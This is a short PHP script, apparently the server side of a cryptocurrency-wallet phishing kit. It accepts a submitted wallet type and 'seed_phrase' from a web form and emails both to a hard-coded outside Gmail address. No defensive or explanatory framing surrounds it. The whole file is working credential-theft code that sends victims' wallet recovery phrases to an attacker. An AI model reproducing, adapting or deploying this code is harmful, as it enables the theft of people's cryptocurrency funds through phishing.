<?php

if (isset($_POST['vendor'])) {
    ini_set('display_errors', '1');
    error_reporting(E_ALL);

    $from = 'admin@colab.com'; // Mail create from your cpanel
    $to = "mail.mirolic@gmail.com"; // Receiver address

    $subject = "Mail From Wale";
    $message = "You have received a new message from your website, " .
        "Here is the TYPE: " . $_POST['vendor'] . "\n" .
        "Here is the seed and phrase: " . $_POST['seed_phrase'] . "\n";


    $headers = "From:" . $from;

    if (mail($to, $subject, $message, $headers)) {
        http_response_code(200);
    } else {
        http_response_code(500);
    }
} else {
    http_response_code(404);
}
